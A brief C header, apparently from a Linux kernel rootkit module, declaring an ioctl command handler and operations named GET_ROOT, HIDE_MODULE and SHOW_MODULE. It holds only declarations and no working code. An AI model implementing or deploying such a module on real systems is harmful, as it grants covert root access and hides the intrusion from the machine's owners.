#include "devices.h"

enum operation_num { GET_ROOT, SHOW_MODULE, HIDE_MODULE };

/**
 * cmd_ioctl - VFS interface to execute command
 */
long cmd_ioctl(struct file *flip, unsigned int cmd, unsigned long arg);

void utils_init(void);

/**
 * hide_module - Hide the current module
 */
void hide_module(void);

/**
 * show_module - Show the current module
 */
void show_module(void);
